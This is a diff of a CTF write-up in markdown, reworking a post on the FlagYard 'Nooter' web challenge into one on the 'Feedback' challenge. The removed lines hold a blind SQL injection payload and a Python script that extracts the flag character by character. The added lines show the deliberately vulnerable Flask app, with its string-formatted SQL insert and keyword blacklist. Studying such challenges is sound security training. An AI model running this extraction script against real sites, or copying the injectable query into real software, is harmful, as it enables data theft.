@@ -1,16 +1,18 @@
 ---
-title: FlagYard - Web - Nooter
+title: FlagYard - Web - Feedback
 date: '2016-03-08'
 tags: ['SQL injection', 'Blind SQL', 'WEB', 'Expoitation']
 draft: false
 summary: Retrieving data from SQLite3 database by exploiting Blind SQl injection in Web Application
 ---
 
-After starting the CTF instance, we are greeted with a simple registration page. At first glance, this seems like a basic “notes” website where users can register, log in, and input their personal notes. However, as CTF participants, we know things are never that simple, and there’s likely a hidden vulnerability for us to exploit.
+# Challenge Description
+> "_Submit your feedback._"
 
-The goal of this challenge is to retrieve the flag. To achieve this, we must analyze the provided source code and attempt to exploit any security loopholes.
+We are provided with the server-side source code. Let's look into it.
 
-```python
+### app.py
+```
 from flask import Flask, render_template, request, redirect, url_for, session
 import sqlite3
 from sqlite3 import Error
@@ -39,28 +41,28 @@ class Database:
             return e
 
     def create_tables(self) -> str:
-        create_user_table = '''
+        create_user_table = """
             CREATE TABLE IF NOT EXISTS user(
                 id integer PRIMARY KEY,
                 username text NOT NULL,
                 password text NOT NULL
             );
-        '''
-        create_user_note = '''
-            CREATE TABLE IF NOT EXISTS notes(
+        """
+        create_user_feedback = """
+            CREATE TABLE IF NOT EXISTS feedback(
                 username text NOT NULL,
-                notes text NOT NULL
+                feedback text NOT NULL
             );
-        '''
-        create_flag_table = '''
+        """
+        create_flag_table = """
             CREATE TABLE IF NOT EXISTS flag(
                 flag text NOT NULL
             );
-        '''
+        """
         if self.conn is not None:
             self.execute_statement(create_user_table)
             self.execute_statement(create_flag_table)
-            self.execute_statement(create_user_note)
+            self.execute_statement(create_user_feedback)
             return "Tables have been created"
         else:
             return "Something went wrong"
@@ -74,7 +76,7 @@ class Database:
             return True
         except:
             return False   
-
+        
     def select(self, statement, *args) -> list:
         curs = self.conn.cursor()
         curs.execute(statement, (args))
@@ -83,17 +85,10 @@ class Database:
         for row in rows:
             result.append(row)
         return result
-```
 
-The application uses an SQLite database for storing users, notes, and the hidden flag. The relevant tables are:
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'e66b6950164958de940d9d117f665c98'
 
-- `user`: Stores the usernames and passwords of registered users.
-- `notes`: Stores notes submitted by logged-in users.
-- `flag`: Stores the flag we're trying to extract.
-
-The application employs a blacklist of certain SQL keywords (e.g., `exec`, `union`, `join`) to prevent common SQL injection attacks:
-
-```python
 def blacklist(string):
     string = string.lower()
     blocked_words = ['exec', 'load', 'blob', 'glob', 'union', 'join', 'like', 'match', 'regexp', 'in', 'limit', 'order', 'hex', 'where']
@@ -101,100 +96,87 @@ def blacklist(string):
         if word in string:
             return True
     return False
-```
 
-### SQL Injection in Notes
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if 'loggedin' in session:
+        msg = ''
+        feedback = ''
+        if request.method == 'POST' and 'feedback' in request.form:
+            feedback = request.form['feedback']
+            if blacklist(feedback):
+                msg = 'Forbidden word detected'
+            else:
+                query = db.insert("INSERT INTO feedback(username, feedback) VALUES(?,'%s')" % feedback, session['username'])
+                if query is not True:
+                    msg = 'Something went wrong'
+                    return render_template('home.html', username=session['username'], msg=msg)
+                feedback = "Thanks for the feedback"
+        return render_template('home.html', username=session['username'], feedback=feedback, msg=msg)
+    return redirect(url_for('login'))
 
-```python
-query = db.insert("INSERT INTO notes(username, notes) VALUES(?,'%s')" % note, session['username'])
-```
-
-### Exploiting the SQL Injection Vulnerability
-
-Testing the application locally, I modified the code to print out the SQL queries being executed:
-
-```python
-def insert(self, statement, *args) -> bool:
-    try:
-        sql = statement
-        print(f"Executing SQL Query: {sql}")
-        curs = self.conn.cursor()
-        curs.execute(sql, (args))
-        self.conn.commit()
-        return True
-    except Exception as e:
-        print(f"Error executing query: {e}")
-        return False
-```
-
-### Blind SQL Injection for Flag Extraction
-
-To extract the flag, I used blind SQL injection:
-
-```sql
-' OR SUBSTR((SELECT flag FROM flag), 1, 1) = 'F'
-```
-
-### Python Script to Automate Flag Extraction
-
-```python
-import requests
-import string
-
-base_url = "http://your-instance-url.com/"
-register_url = base_url + "register"
-login_url = base_url + "login"
-add_note_url = base_url
-
-charset = string.digits + string.ascii_letters + "{}_"
-flag = ""
-position = 1
-
-username = "your_username"  
-password = "your_password" 
-
-session = requests.Session()
-
+@app.route('/login', methods=['GET', 'POST'])
 def login():
-    login_data = {"username": username, "password": password}
-    response = session.post(login_url, data=login_data)
-    if "Welcome" in response.text:
-        print("[+] Login successful!")
-    else:
-        print("[-] Login failed.")
-        exit()
+    msg = ''
+    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
+        username = request.form['username']
+        password = request.form['password']
 
-def test_char_for_position(char, position):
-    payload = f"' OR SUBSTR((SELECT flag FROM flag), {position}, 1) = '{char}"
-    data = {"note": payload}
-    response = session.post(add_note_url, data=data)
+        account = db.select("SELECT * FROM user where username = ? and password = ?", username, password)
+        if account:
+            session['loggedin'] = True
+            session['id'] = account[0][0]
+            session['username'] = account[0][1]
 
-    reflected_values = [val for val in response.text if val in ('0', '1')]
+            return redirect(url_for('index'))
+        else:
+            msg = 'Incorrect username/password!'
 
-    if reflected_values and reflected_values[-1] == '1':
-        print(f"[+] Correct character at position {position}: '{char}'")
-        return True
-    return False
+    return render_template('index.html', msg=msg)
 
-login()
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    msg = ''
+    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
+        username = request.form['username']
+        password = request.form['password']
+        
+        account = db.select("SELECT * FROM user where username = ? and password = ?", username, password)
+        if account:
+            msg = 'Account already exists!'
+        elif not re.match(r'[A-Za-z0-9]+', username):
+            msg = 'Username must contain only characters and numbers!'
+        elif not username or not password:
+            msg = 'Please fill out the form!'
+        else:
+            db.insert("INSERT INTO user(username, password) Values (?,?)", username, password)
+            msg = 'You have successfully registered!'
+    elif request.method == 'POST':
+        msg = 'Please fill out the form!'
+        
+    return render_template('register.html', msg=msg)
 
-while True:
-    found_char = False
-    for char in charset:
-        if test_char_for_position(char, position):
-            flag += char
-            print(f"[+] Flag so far: {flag}")
-            position += 1
-            found_char = True
-            break
-    
-    if not found_char:
-        print("[*] Flag extraction complete!")
-        break
+@app.route('/logout')
+def logout():
+    session.pop('loggedin', None)
+    session.pop('id', None)
+    session.pop('username', None)
+    return redirect(url_for('login'))
 
-print(f"[+] Extracted flag: {flag}")
+if '__main__' == __name__:
+    db = Database('./sqlite.db')
+    db.create_tables()
+    db.insert("INSERT INTO flag(flag) VALUES (?)", "FlagY{fake_flag}")
+    app.run(host='0.0.0.0', port=5000)
 ```
 
-The script maintains a session throughout to avoid logging in for every request, dynamically generates SQL injection payloads for each character and position, and extracts characters one by one until the entire flag is retrieved.
+It is a simple web application that inserts the value `FlagY{fake_flag}` into the `flag` column of the `flag` table in a database and provides register and login functionality. After a user logs in, they can submit feedback, which is stored in the `feedback` table. The vulnerability lies in the feedback submission query:
 
-Flag extracted: ``FlagY{**********************************}``
+```
+ query = db.insert("INSERT INTO feedback(username, feedback) VALUES(?,'%s')" % feedback, session['username'])
+```
+
+In this case, while the query is vulnerable to SQL injection due to direct user input placement without parameterization (using `%s`), two challenges limit the exploitation:
+- **Keyword Filtering:** The system filters potentially dangerous SQL keywords like exec, load, and match, which could otherwise be used to craft malicious queries.
+- **No Direct Reflection:** Since the query only inserts data into the database without reflecting any results back to the user (e.g., no response or display of inserted data), it limits the attacker's ability to verify or exploit the SQL injection easily.
+
